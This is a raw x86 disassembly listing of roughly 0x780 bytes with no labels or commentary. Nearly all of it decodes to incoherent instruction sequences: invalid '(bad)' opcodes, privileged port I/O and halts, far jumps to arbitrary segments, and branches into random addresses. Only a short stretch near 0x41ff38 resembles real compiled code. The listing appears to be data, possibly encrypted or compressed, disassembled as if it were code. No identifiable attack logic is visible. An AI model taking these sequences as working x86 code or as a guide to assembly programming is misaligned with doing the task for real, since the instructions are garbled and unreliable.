  41fbca:	adc    cl,dh
  41fbcc:	jbe    0x41fbe3
  41fbce:	and    esp,DWORD PTR [ecx-0x3e]
  41fbd1:	mov    edi,0x3168654a
  41fbd6:	pushf  
  41fbd7:	jmp    0xa07103ea
  41fbdc:	mov    eax,0x8da54113
  41fbe1:	cmc    
  41fbe2:	hlt    
  41fbe3:	cmp    bh,BYTE PTR [eax]
  41fbe5:	inc    esp
  41fbe6:	hlt    
  41fbe7:	mov    ecx,0x2f278edd
  41fbec:	jmp    0x67cf:0x3cda4a15
  41fbf3:	dec    ecx
  41fbf4:	jecxz  0x41fbb4
  41fbf6:	pop    ebp
  41fbf7:	dec    esi
  41fbf8:	out    dx,eax
  41fbf9:	mov    edx,0x66abf838
  41fbfe:	int3   
  41fbff:	push   0x9a2c406d
  41fc04:	cdq    
  41fc05:	(bad)  
  41fc06:	stos   DWORD PTR es:[edi],eax
  41fc07:	dec    ebp
  41fc08:	aam    0x56
  41fc0a:	fs xchg edx,eax
  41fc0c:	in     eax,0x79
  41fc0e:	xchg   ebx,eax
  41fc0f:	and    esp,DWORD PTR [ecx+0x745dcd33]
  41fc15:	dec    ebp
  41fc16:	inc    eax
  41fc17:	jle    0x41fc00
  41fc19:	test   eax,0x5d177a83
  41fc1e:	call   0x871931e
  41fc23:	lods   eax,DWORD PTR ds:[esi]
  41fc24:	xor    DWORD PTR [eax],ebx
  41fc26:	fdiv   QWORD PTR [edx-0x22]
  41fc29:	inc    esp
  41fc2a:	mov    esi,0xa1645bc2
  41fc2f:	outs   dx,DWORD PTR ds:[esi]
  41fc30:	imul   eax,DWORD PTR [ebx-0x191ce8a1],0xef4866ba
  41fc3a:	or     DWORD PTR [edx-0x31f874e],ebp
  41fc40:	ja     0x41fc32
  41fc42:	and    al,BYTE PTR [ebx+eax*1+0x3a354795]
  41fc49:	cmp    DWORD PTR [ebp-0x48],edi
  41fc4c:	icebp  
  41fc4d:	inc    eax
  41fc4e:	fidivr WORD PTR [ebp-0x6f]
  41fc51:	rol    al,0x63
  41fc54:	cld    
  41fc55:	pop    esp
  41fc56:	scas   eax,DWORD PTR es:[edi]
  41fc57:	adc    eax,0x1e7aa11a
  41fc5c:	mov    fs,WORD PTR [edi+0x1f]
  41fc5f:	pop    edi
  41fc60:	adc    eax,0x6dbeca65
  41fc65:	mov    al,0x80
  41fc67:	jns    0x41fc9d
  41fc69:	out    dx,al
  41fc6a:	aas    
  41fc6b:	pop    edx
  41fc6c:	adc    DWORD PTR [ebp+0x6f],0xfffffff0
  41fc70:	sbb    al,dl
  41fc72:	pop    es
  41fc73:	loope  0x41fcca
  41fc75:	retf   0x22ed
  41fc78:	in     al,0x94
  41fc7a:	jns    0x41fc88
  41fc7c:	add    ebx,0x74
  41fc7f:	fs sub al,0x5d
  41fc82:	jg     0x41fcc7
  41fc84:	in     eax,dx
  41fc85:	outs   dx,DWORD PTR ds:[esi]
  41fc86:	test   DWORD PTR [eax-0x5e32f3ea],esp
  41fc8c:	ds cs popf 
  41fc8f:	das    
  41fc90:	jne    0x41fcab
  41fc92:	shrd   DWORD PTR [ebx+0x7efb0581],ebx,0x8
  41fc9a:	dec    ebp
  41fc9b:	adc    DWORD PTR [edi],esi
  41fc9d:	lods   al,BYTE PTR ds:[esi]
  41fc9e:	xchg   DWORD PTR [eax+0x75],ebp
  41fca1:	leave  
  41fca2:	not    ebp
  41fca4:	je     0x41fcfe
  41fca6:	mov    esp,DWORD PTR ds:0x5c94e841
  41fcac:	arpl   WORD PTR [ebx-0x2a],si
  41fcaf:	or     bh,al
  41fcb1:	mov    ds:0x63714485,eax
  41fcb6:	cmp    BYTE PTR [ebp+0x3dc8037d],dh
  41fcbc:	dec    ebx
  41fcbd:	mov    eax,ds:0x6ed6db1e
  41fcc2:	cmp    ebp,DWORD PTR [edi-0x1c9c5ab9]
  41fcc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcc9:	ja     0x41fc88
  41fccb:	aas    
  41fccc:	shr    BYTE PTR [ebx+0x3b37434],1
  41fcd2:	je     0x41fd1d
  41fcd4:	in     al,0x58
  41fcd6:	add    ch,al
  41fcd8:	test   DWORD PTR [edi+0x57],ecx
  41fcdb:	leave  
  41fcdc:	not    al
  41fcde:	addr16 ja 0x41fcb9
  41fce1:	cdq    
  41fce2:	fistp  QWORD PTR [edi]
  41fce4:	xchg   ebx,eax
  41fce5:	stos   DWORD PTR es:[edi],eax
  41fce6:	push   ds
  41fce7:	rcl    BYTE PTR [ebx],cl
  41fce9:	out    0x7d,al
  41fceb:	and    BYTE PTR [edx+0x111e643a],0xaf
  41fcf2:	in     eax,0x27
  41fcf4:	sti    
  41fcf5:	push   ss
  41fcf6:	jbe    0x41fcd3
  41fcf8:	jo     0x41fcb3
  41fcfa:	xchg   edi,eax
  41fcfb:	js     0x41fd36
  41fcfd:	sub    DWORD PTR [eax+0x68],0xffffffb5
  41fd01:	lock xchg edx,eax
  41fd03:	xor    BYTE PTR [ebx+0x54],0x97
  41fd07:	cwde   
  41fd08:	xchg   edi,eax
  41fd0a:	inc    ecx
  41fd0b:	xor    eax,0x5e2bf75e
  41fd10:	mov    DWORD PTR [esp+esi*4],ebx
  41fd13:	inc    ebp
  41fd14:	dec    ebx
  41fd15:	xor    al,0xf
  41fd17:	addr16 leave 
  41fd19:	or     eax,0x5b991991
  41fd1e:	popf   
  41fd1f:	xor    eax,0x783ca0a4
  41fd24:	pop    ebp
  41fd25:	out    0xf,al
  41fd27:	stos   BYTE PTR es:[edi],al
  41fd28:	ins    BYTE PTR es:[edi],dx
  41fd29:	dec    ecx
  41fd2a:	das    
  41fd2b:	aaa    
  41fd2c:	dec    edi
  41fd2d:	xor    ebx,DWORD PTR [edx+0x10797fbc]
  41fd33:	out    dx,al
  41fd34:	sbb    ch,BYTE PTR [eax]
  41fd36:	inc    esi
  41fd37:	lods   al,BYTE PTR ds:[esi]
  41fd38:	cmc    
  41fd39:	push   cs
  41fd3a:	sbb    eax,DWORD PTR [ebx-0xe]
  41fd3d:	xchg   edx,eax
  41fd3e:	fisub  WORD PTR ds:0x686299bb
  41fd44:	hlt    
  41fd45:	stos   DWORD PTR es:[edi],eax
  41fd46:	sbb    al,0x8f
  41fd48:	jecxz  0x41fd93
  41fd4a:	popf   
  41fd4b:	(bad)  
  41fd4c:	test   eax,0x37b750f9
  41fd51:	loopne 0x41fd0f
  41fd53:	bound  esi,QWORD PTR [ecx-0x49]
  41fd56:	mov    ebp,0x72d84dc3
  41fd5b:	xchg   edx,eax
  41fd5c:	fcomp  QWORD PTR [ebp+0x7bfba743]
  41fd62:	in     eax,dx
  41fd63:	into   
  41fd64:	nop
  41fd65:	icebp  
  41fd66:	and    al,0x50
  41fd68:	fs inc edx
  41fd6a:	inc    esi
  41fd6b:	add    DWORD PTR ds:0x673b5d1a,esp
  41fd71:	dec    esp
  41fd72:	xchg   BYTE PTR [esi],bl
  41fd74:	mov    bh,0x69
  41fd76:	aaa    
  41fd77:	dec    eax
  41fd78:	adc    DWORD PTR [edi],ebx
  41fd7a:	bnd jno 0x41fdcb
  41fd7d:	test   DWORD PTR [ebp+ecx*1-0x36a12114],eax
  41fd84:	sub    edi,DWORD PTR [esi-0x33bd7e64]
  41fd8a:	sbb    DWORD PTR [edx],0xb3dbe7e9
  41fd90:	lock add edx,eax
  41fd93:	sbb    esi,ebp
  41fd95:	mov    WORD PTR [ebx+0x41fabe70],?
  41fd9b:	add    DWORD PTR [ebx-0x149d651d],ebx
  41fda1:	sub    ebp,DWORD PTR [eax-0x198f052f]
  41fda7:	(bad)  
  41fda8:	std    
  41fda9:	dec    ebp
  41fdaa:	inc    ecx
  41fdab:	jmp    0x4be6e0d3
  41fdb0:	xor    al,0xcf
  41fdb2:	hlt    
  41fdb3:	cmp    edx,DWORD PTR [esi+eiz*2+0x5f]
  41fdb7:	or     BYTE PTR [ebx],al
  41fdb9:	aad    0x4c
  41fdbb:	mov    eax,ds:0x5a7de2f1
  41fdc0:	out    dx,eax
  41fdc1:	dec    edx
  41fdc2:	loope  0x41fe23
  41fdc4:	test   BYTE PTR [esi-0x16e06ec6],bl
  41fdca:	mov    bh,0x8b
  41fdcc:	ret    
  41fdcd:	push   ebp
  41fdce:	stc    
  41fdcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd0:	scas   eax,DWORD PTR es:[edi]
  41fdd1:	and    al,0xcb
  41fdd3:	ss test eax,0x7920efd1
  41fdd9:	jmp    0x4168f228
  41fdde:	ret    0x6861
  41fde1:	aam    0xed
  41fde3:	xor    ebx,esi
  41fde5:	inc    esi
  41fde6:	inc    ebx
  41fde7:	iret   
  41fde8:	arpl   WORD PTR [ecx+0x2c],bx
  41fdeb:	std    
  41fdec:	xor    BYTE PTR [edx-0xbce66c3],0xaf
  41fdf3:	lods   al,BYTE PTR ds:[esi]
  41fdf4:	hlt    
  41fdf5:	push   edx
  41fdf6:	retf   
  41fdf7:	dec    edx
  41fdf8:	push   ecx
  41fdf9:	aad    0xde
  41fdfb:	shl    cl,1
  41fdfd:	mov    ebx,0xe7532afb
  41fe02:	and    BYTE PTR [edx-0x41a2e31e],bl
  41fe08:	mov    ah,0xe0
  41fe0a:	fwait
  41fe0b:	aaa    
  41fe0c:	dec    DWORD PTR [edi*4+0x7ffb526b]
  41fe13:	xor    DWORD PTR [ebp+0x407fc2b1],0x557c5f3f
  41fe1d:	jmp    0x41fdf1
  41fe1f:	mov    bh,0x5a
  41fe21:	out    dx,al
  41fe22:	push   ebp
  41fe23:	mov    fs,eax
  41fe25:	sar    ebx,0xf4
  41fe28:	iret   
  41fe29:	inc    ebx
  41fe2a:	(bad)
  41fe2e:	nop
  41fe2f:	sub    al,BYTE PTR [ecx+0x5c4c9976]
  41fe35:	in     eax,0xd6
  41fe37:	push   edi
  41fe38:	out    0xe7,al
  41fe3a:	inc    eax
  41fe3b:	mov    al,ds:0x41c7dfc9
  41fe40:	jae    0x41fdd1
  41fe42:	xor    esi,DWORD PTR [ebp+0x34a7b2b2]
  41fe48:	or     bl,BYTE PTR [edx]
  41fe4a:	sbb    ah,ch
  41fe4c:	jmp    0xefcfedbb
  41fe51:	das    
  41fe52:	popf   
  41fe53:	adc    bh,dl
  41fe55:	lock push ebp
  41fe57:	cmp    al,0x65
  41fe59:	sub    BYTE PTR [ebx-0x64],ch
  41fe5c:	mov    ecx,0x3c6732d9
  41fe61:	inc    edx
  41fe62:	or     DWORD PTR [ecx+0x45],eax
  41fe65:	xor    bh,BYTE PTR [edi+ebp*8-0x74]
  41fe69:	jb     0x41fe06
  41fe6b:	sub    DWORD PTR [esi+0x10],esp
  41fe6e:	and    ah,BYTE PTR [ebp+0x52]
  41fe71:	(bad)  
  41fe72:	jnp    0x41fe5e
  41fe74:	push   ebx
  41fe75:	(bad)  
  41fe76:	loop   0x41feb2
  41fe78:	sub    DWORD PTR [edi],ecx
  41fe7a:	fisub  DWORD PTR [edx-0x3a655874]
  41fe80:	out    dx,eax
  41fe81:	xchg   ebp,eax
  41fe82:	popf   
  41fe83:	fadd   DWORD PTR [edi]
  41fe85:	xor    dh,BYTE PTR [ebx+0x3d4d689e]
  41fe8b:	jmp    0xacd70a8c
  41fe90:	add    DWORD PTR [eax],esp
  41fe92:	mov    ds:0x2927362b,eax
  41fe97:	mov    esp,DWORD PTR [edx+0x5076bda9]
  41fe9d:	xor    eax,0x40785e8d
  41fea2:	or     al,0x3d
  41fea4:	(bad)  
  41fea5:	or     esi,DWORD PTR [ebp-0x1297e9e7]
  41feab:	les    ecx,FWORD PTR [edi]
  41fead:	cmp    cl,BYTE PTR [ecx+0x15]
  41feb0:	mov    cl,0x90
  41feb2:	and    ebp,edx
  41feb4:	imul   esi,esp,0x1259524
  41feba:	xor    dh,BYTE PTR [edx+0x29]
  41febd:	adc    bh,BYTE PTR [edx+ecx*4+0x7]
  41fec1:	(bad)  
  41fec2:	sbb    dl,BYTE PTR [ebx+esi*4-0x55]
  41fec6:	test   eax,0xe53d8c41
  41fecb:	xor    al,0x4
  41fecd:	inc    edi
  41fece:	cld    
  41fecf:	sub    edx,DWORD PTR [eax]
  41fed1:	jecxz  0x41ff03
  41fed3:	push   esi
  41fed4:	or     al,0x31
  41fed6:	clc    
  41fed7:	adc    al,BYTE PTR [edi+0xb]
  41feda:	adc    DWORD PTR [edx-0x34],0xffffff8e
  41fede:	jo     0x41fea1
  41fee0:	and    DWORD PTR [esi+0x37fa2cf2],0x2d
  41fee7:	mov    eax,0x9bf85bcb
  41feec:	aam    0x56
  41feee:	cmp    DWORD PTR [edi+ebx*1+0x4],0x7773365b
  41fef6:	add    ch,dl
  41fef8:	xchg   edi,eax
  41fef9:	js     0x41fefd
  41fefb:	adc    edx,DWORD PTR [ebp+esi*1+0xa]
  41feff:	lds    ebx,FWORD PTR [esi]
  41ff01:	not    DWORD PTR [edx+0x4a]
  41ff04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff05:	fwait
  41ff06:	ret    
  41ff07:	mov    dh,0x95
  41ff09:	repnz mov ebx,0xfc7dbfcb
  41ff0f:	mov    dh,0x4e
  41ff11:	in     eax,0x85
  41ff13:	pushf  
  41ff14:	push   ds
  41ff15:	test   al,0x2b
  41ff17:	jae    0x41febc
  41ff19:	cmc    
  41ff1a:	je     0x41ff5c
  41ff1c:	jmp    0x41feb1
  41ff1e:	es pusha 
  41ff20:	nop
  41ff21:	mov    edi,0xb44c3115
  41ff26:	gs xor al,0x6b
  41ff29:	bound  ebp,QWORD PTR [esi]
  41ff2b:	xchg   esp,eax
  41ff2c:	jl     0x41ff4c
  41ff2e:	in     al,0x74
  41ff30:	mov    ah,0x5f
  41ff32:	mov    al,0xc3
  41ff34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff35:	adc    BYTE PTR [esi],ch
  41ff37:	popf   
  41ff38:	xor    edx,edx
  41ff3a:	push   0x3
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	or     al,0xae
  41ff64:	push   0xffffffd1
  41ff66:	arpl   WORD PTR [ebp-0x3bb54140],dx
  41ff6c:	mov    esi,0x77b71dbe
  41ff71:	fld    DWORD PTR [ebp+ebp*1+0x10]
  41ff75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff76:	adc    eax,0xae5acd1f
  41ff7b:	dec    eax
  41ff7c:	jnp    0x41ff10
  41ff7e:	inc    eax
  41ff7f:	frstor [esi-0x1fa26077]
  41ff85:	pop    ebx
  41ff86:	dec    esp
  41ff87:	test   ah,dl
  41ff89:	xor    DWORD PTR [ecx+0x64],esp
  41ff8c:	(bad)  
  41ff8e:	ret    0xaeb9
  41ff91:	out    dx,eax
  41ff92:	stos   BYTE PTR es:[edi],al
  41ff93:	test   al,0x83
  41ff95:	push   edi
  41ff96:	ficomp DWORD PTR [ebp+0x52]
  41ff99:	cmp    ch,dl
  41ff9b:	or     esp,DWORD PTR [ebx]
  41ff9d:	xlat   BYTE PTR ds:[ebx]
  41ff9e:	pop    esp
  41ff9f:	js     0x41ff55
  41ffa1:	add    dl,BYTE PTR [ecx-0x5b]
  41ffa4:	outs   dx,DWORD PTR ds:[esi]
  41ffa5:	test   DWORD PTR [ebp-0x12],ebp
  41ffa8:	(bad)  
  41ffa9:	fcomp  st(6)
  41ffab:	pop    es
  41ffac:	jmp    0x25d3:0x972f7837
  41ffb3:	and    eax,0xb6de92ad
  41ffb8:	cmp    BYTE PTR [ebp-0x2c0c22f0],ch
  41ffbe:	mov    DWORD PTR fs:[eax-0x24c45257],edx
  41ffc5:	mov    ds:0xa16a5bc9,eax
  41ffca:	dec    ebx
  41ffcb:	sti    
  41ffcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffcd:	mov    eax,0x3db98fb0
  41ffd2:	push   esi
  41ffd3:	jae    0x420027
  41ffd5:	push   esp
  41ffd6:	pop    esi
  41ffd8:	loope  0x41ffb7
  41ffda:	mov    ds,WORD PTR [edx-0x1dc76c21]
  41ffe0:	cmp    BYTE PTR [ebp+0xe6a6568],al
  41ffe6:	or     edx,DWORD PTR [esp+ebx*8-0xd]
  41ffea:	xor    al,0xcc
  41ffec:	xchg   BYTE PTR [eax+0x3d],cl
  41ffef:	pop    ebx
  41fff0:	and    dl,BYTE PTR [edi]
  41fff2:	jmp    0x41fffa
  41fff4:	sbb    BYTE PTR [eax],dl
  41fff6:	xchg   BYTE PTR [ecx+0x32],bh
  41fff9:	add    edx,edi
  41fffb:	adc    al,0x7f
  41fffd:	pop    ds
  41fffe:	jne    0x41fff5
  420000:	add    eax,0xe1cce0a7
  420005:	push   edi
  420006:	(bad)  
  420007:	lods   al,BYTE PTR ds:[esi]
  420008:	bound  bp,DWORD PTR ds:0xf0872eb4
  42000f:	shl    BYTE PTR [edi-0x38556f6f],0xad
  420016:	fst    DWORD PTR [ebx-0xe]
  420019:	jnp    0x41fff5
  42001b:	in     eax,0x3c
  42001d:	dec    esi
  42001e:	int3   
  42001f:	inc    edi
  420020:	jecxz  0x41ffb2
  420022:	shr    BYTE PTR [edx],cl
  420024:	(bad)  
  420025:	and    eax,0xbb240155
  42002a:	cmp    BYTE PTR [ecx-0x43e08989],bl
  420030:	xor    BYTE PTR [ebp-0x2e],cl
  420033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420034:	(bad)  
  420036:	retf   0x8a95
  420039:	fdivr  DWORD PTR [edx+0x59]
  42003c:	out    0x3c,al
  42003e:	loope  0x420044
  420040:	sub    al,0xf4
  420042:	xor    edx,ebp
  420044:	mov    dl,0x79
  420046:	xor    dl,BYTE PTR [ecx]
  420048:	xor    eax,0x7f3f86d1
  42004d:	mov    DWORD PTR [edx],eax
  42004f:	jnp    0x420086
  420051:	mov    dh,0xb4
  420053:	add    BYTE PTR [ecx+0x2e],al
  420056:	aaa    
  420057:	jbe    0x420083
  420059:	test   eax,0xd38812f7
  42005e:	hlt    
  42005f:	jbe    0x420038
  420061:	inc    ebp
  420062:	jl     0x420024
  420064:	inc    edx
  420065:	lahf   
  420066:	xlat   BYTE PTR ds:[ebx]
  420067:	cmc    
  420068:	dec    ecx
  420069:	lock xchg edi,eax
  42006b:	sbb    bh,cl
  42006d:	jge    0x42009d
  42006f:	pop    edi
  420070:	dec    ecx
  420071:	jno    0x420098
  420073:	mov    eax,0xd0d8f4a0
  420078:	test   al,0xab
  42007a:	mov    ebp,DWORD PTR [edi+edx*1+0x3f353216]
  420081:	and    al,0x2e
  420083:	adc    BYTE PTR [ecx],bl
  420085:	stos   BYTE PTR es:[edi],al
  420086:	in     eax,0xb
  420088:	bound  eax,QWORD PTR [ebx]
  42008a:	jp     0x420024
  42008c:	pushf  
  42008d:	(bad)  
  42008e:	out    dx,eax
  42008f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420090:	sti    
  420091:	iret   
  420092:	ror    BYTE PTR [ebx],0xee
  420095:	or     DWORD PTR [edi+0x32dcfab7],ebx
  42009b:	es cmc 
  42009d:	cld    
  42009e:	pop    es
  42009f:	push   eax
  4200a0:	or     cl,BYTE PTR [ebp+0x12]
  4200a3:	bnd ss jmp 0xb8bf58d8
  4200aa:	xor    dl,ch
  4200ac:	test   BYTE PTR [edx-0x22],0xea
  4200b0:	jns    0x42009e
  4200b2:	xchg   edi,eax
  4200b3:	ret    0xcb60
  4200b6:	and    ecx,esp
  4200b8:	push   ebp
  4200b9:	(bad)  
  4200ba:	(bad)
  4200bd:	dec    ebp
  4200be:	aad    0xf2
  4200c0:	sub    al,0x6e
  4200c2:	enter  0xb1b8,0x37
  4200c6:	push   ss
  4200c7:	pushf  
  4200c8:	scas   al,BYTE PTR es:[edi]
  4200c9:	jns    0x4200bc
  4200cb:	ret    0x390e
  4200ce:	not    BYTE PTR [ebx+ebp*8-0x7e319eab]
  4200d5:	mov    BYTE PTR ds:0xf78be636,bl
  4200db:	jns    0x420123
  4200dd:	stc    
  4200de:	xchg   ebp,eax
  4200df:	movzx  ecx,WORD PTR [ebp+0x52bfd303]
  4200e6:	add    ah,BYTE PTR [edx]
  4200e8:	mov    bh,0xdd
  4200ea:	pop    esp
  4200eb:	sub    eax,0xc5a6563
  4200f0:	aaa    
  4200f1:	out    dx,al
  4200f2:	pop    esp
  4200f3:	pop    ebx
  4200f4:	adc    BYTE PTR [edi+0x3b5771f8],0xea
  4200fb:	push   edx
  4200fc:	mov    DWORD PTR [eax],ebx
  4200fe:	mov    BYTE PTR [eax+eax*2-0x309aa409],bl
  420105:	mov    di,0x33e5
  420109:	mov    WORD PTR [edi+0x64b53b27],gs
  42010f:	push   esi
  420110:	inc    ecx
  420111:	push   es
  420112:	jecxz  0x420100
  420114:	ins    DWORD PTR es:[edi],dx
  420115:	pop    edx
  420116:	je     0x420121
  420118:	mov    edi,0x2d2ea382
  42011d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42011e:	jo     0x420197
  420120:	mov    ds:0x4fb06ab3,al
  420125:	scas   eax,DWORD PTR es:[edi]
  420126:	popf   
  420127:	aaa    
  420128:	test   dh,al
  42012a:	xor    eax,0x5ec76911
  42012f:	sti    
  420130:	(bad)  
  420131:	pop    es
  420132:	and    eax,0x56590e10
  420137:	outs   dx,BYTE PTR ds:[esi]
  420138:	rep outs dx,BYTE PTR ds:[esi]
  42013a:	fucomip st,st(6)
  42013c:	and    DWORD PTR [edi+0x9f364a5],eax
  420142:	in     al,dx
  420143:	or     eax,0xdb9a975b
  420148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420149:	lods   eax,DWORD PTR ds:[esi]
  42014a:	shl    ch,0xdc
  42014d:	lahf   
  42014e:	xor    al,0xf1
  420150:	(bad)  
  420152:	daa    
  420153:	push   esi
  420154:	dec    edx
  420155:	sub    DWORD PTR [ebx-0x5a],0xc5e0cf77
  42015c:	call   0x5514:0x6796e3d7
  420163:	xchg   esi,eax
  420164:	push   esp
  420165:	mov    ah,0x84
  420167:	inc    eax
  420168:	cmp    ebx,DWORD PTR [ecx+0x6a05962]
  42016e:	imul   esi,DWORD PTR [edx-0x74a47c73],0x72
  420175:	loop   0x420177
  420177:	daa    
  420178:	pop    edx
  420179:	sbb    DWORD PTR [ecx],ecx
  42017b:	mov    dh,0xe6
  42017d:	cmp    BYTE PTR [esi+ecx*2+0x3d],dl
  420181:	pushf  
  420182:	push   ecx
  420183:	and    cl,BYTE PTR [esi-0x52]
  420186:	imul   esi,DWORD PTR [esi],0xcd5522a1
  42018c:	popf   
  42018d:	in     eax,dx
  42018e:	dec    edx
  42018f:	fnsave [edi+0x4490e20b]
  420195:	mov    ds:0x87a124c0,al
  42019a:	enter  0x691e,0xc6
  42019e:	push   ebp
  42019f:	cmp    bl,ah
  4201a1:	int    0x0
  4201a3:	je     0x42013a
  4201a5:	jbe    0x4201f0
  4201a7:	je     0x42012e
  4201a9:	mov    esp,0xc5c5cb2
  4201ae:	sbb    ch,BYTE PTR [esi-0x23]
  4201b1:	sar    DWORD PTR [edx-0x51],1
  4201b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201b5:	call   0x6229:0x4e8124f0
  4201bc:	or     eax,0x290158a6
  4201c1:	xchg   ebx,eax
  4201c2:	in     al,dx
  4201c3:	jp     0x420159
  4201c5:	loop   0x420168
  4201c7:	stos   DWORD PTR es:[edi],eax
  4201c8:	fld    QWORD PTR [esi-0x615af234]
  4201ce:	les    edi,FWORD PTR [edx]
  4201d0:	pop    es
  4201d1:	call   0xbd8d:0xe366f913
  4201d8:	(bad)  
  4201d9:	(bad)  
  4201da:	enter  0x79df,0x9c
  4201de:	dec    BYTE PTR [edi]
  4201e0:	gs stos DWORD PTR es:[edi],eax
  4201e2:	push   ebp
  4201e3:	cld    
  4201e4:	cs jb  0x420167
  4201e7:	das    
  4201e8:	push   0xfffffffd
  4201ea:	push   edx
  4201eb:	(bad)  
  4201ec:	sub    DWORD PTR [edi+edx*8-0x59],eax
  4201f0:	mov    edi,0x92122aaf
  4201f5:	sub    bh,BYTE PTR [edi]
  4201f7:	mov    ecx,0x903f31ae
  4201fc:	xlat   BYTE PTR ds:[ebx]
  4201fd:	jnp    0x4201f4
  4201ff:	sub    cl,BYTE PTR [ecx-0x133517a9]
  420205:	cmp    dh,BYTE PTR [ecx-0x54]
  420208:	lock cwde 
  42020a:	iret   
  42020b:	pop    ds
  42020c:	jne    0x42020b
  42020e:	xchg   edx,eax
  42020f:	mov    ah,0xdb
  420211:	call   DWORD PTR [edi]
  420213:	push   ebx
  420214:	push   ebx
  420215:	fmulp  st(7),st
  420217:	inc    esp
  420218:	rcl    BYTE PTR [eax+ebp*4],0x22
  42021c:	pop    ds
  42021d:	ins    BYTE PTR es:[edi],dx
  42021e:	add    al,0x2c
  420220:	retf   
  420221:	sar    DWORD PTR [edi-0x1b3e78d4],0xa
  420228:	xor    BYTE PTR [eax],ch
  42022a:	aaa    
  42022b:	gs pop esi
  42022d:	push   ebx
  42022e:	faddp  st(5),st
  420230:	sbb    al,0x1a
  420232:	or     DWORD PTR [ecx+ebp*8+0x653686ee],edi
  420239:	dec    edi
  42023a:	es dec edx
  42023c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42023d:	add    edx,esi
  42023f:	xchg   ebp,eax
  420240:	and    al,0xa9
  420242:	cs enter 0x1fc1,0xba
  420247:	xchg   esp,eax
  420248:	xlat   BYTE PTR fs:[ebx]
  42024a:	xor    dl,BYTE PTR [ecx-0xf8dcda1]
  420250:	add    BYTE PTR [ecx+0xb9b1479],bl
  420256:	pop    esi
  420257:	cmp    DWORD PTR [ecx+0xfdb2f1d],ebp
  42025d:	mov    edx,0x3a8075d7
  420262:	repnz lock enter 0x15d2,0xfc
  420268:	ja     0x420204
  42026a:	das    
  42026b:	scas   al,BYTE PTR es:[edi]
  42026c:	sbb    eax,0xe1fa4d13
  420271:	dec    ebx
  420272:	jg     0x4202a5
  420274:	nop
  420275:	call   0x6d80:0x4785df34
  42027c:	(bad)  
  42027d:	jg     0x420216
  42027f:	add    DWORD PTR [edi+0x5f],edi
  420282:	sahf   
  420283:	icebp  
  420284:	xchg   ebp,eax
  420285:	gs fs sti 
  420288:	lock jb 0x4202b3
  42028b:	mov    BYTE PTR [edx+ebx*4+0x28494d86],bh
  420292:	pop    ecx
  420293:	pop    ds
  420294:	or     DWORD PTR [ecx],edx
  420296:	cli    
  420297:	scas   eax,DWORD PTR es:[edi]
  420298:	(bad)  
  42029a:	mov    ch,0x73
  42029c:	and    esi,edx
  42029e:	mov    esi,0x344efbb4
  4202a3:	inc    ebp
  4202a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202a5:	lds    ebx,FWORD PTR [ebp+0x6f]
  4202a8:	push   esi
  4202a9:	bound  ebx,QWORD PTR [ecx+0x53]
  4202ac:	sbb    DWORD PTR [ecx],eax
  4202ae:	add    al,0x1e
  4202b0:	cwde   
  4202b1:	stos   BYTE PTR es:[edi],al
  4202b2:	iret   
  4202b3:	cmp    eax,0xaa42e603
  4202b8:	jge    0x42027b
  4202ba:	mov    ebx,0x822d3e68
  4202bf:	jb     0x4202c9
  4202c1:	mov    edx,0x16f4452a
  4202c6:	fnsave [edx+0x2b01a529]
  4202cc:	mov    al,ds:0xfd1b7618
  4202d1:	mov    bl,0xed
  4202d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202d4:	push   0xd62f3c26
  4202d9:	mov    eax,0xfe82b97d
  4202de:	dec    edi
  4202df:	out    0x1f,eax
  4202e1:	enter  0xff58,0xbf
  4202e5:	(bad)  
  4202e6:	fst    QWORD PTR [eax+0x16866360]
  4202ec:	mov    ebx,DWORD PTR [edi]
  4202ee:	dec    edi
  4202ef:	and    si,dx
  4202f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202f3:	test   DWORD PTR [ecx+esi*4-0x66],ebp
  4202f7:	inc    DWORD PTR [ebp+0x12]
  4202fa:	pmulhuw mm1,QWORD PTR [ebx]
  4202fd:	rol    BYTE PTR gs:[eax],0x3f
  420301:	mov    ds:0xc1c2b2fc,eax
  420306:	sbb    bl,BYTE PTR [edx+0x3f]
  420309:	sub    BYTE PTR [esp+edx*8+0x286c9ae9],cl
  420310:	inc    edx
  420311:	iret   
  420312:	sub    DWORD PTR [esi+0x6541b00b],0x38
  420319:	mov    WORD PTR [ebp-0x5f2f0d1f],gs
  42031f:	pop    ebp
  420320:	mov    al,ds:0x37f6027a
  420325:	mov    es,WORD PTR [esi]
  420327:	mov    eax,0xa1e65f49
  42032c:	lods   eax,DWORD PTR ds:[esi]
  42032d:	mov    ebp,0x71f39f7a
  420332:	outs   dx,BYTE PTR ds:[esi]
  420333:	jns    0x42032e
  420335:	add    DWORD PTR [eiz*8-0x72f7b275],eax
  42033c:	test   BYTE PTR [ecx],al
  42033e:	stc    
  42033f:	mov    bh,0xac
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
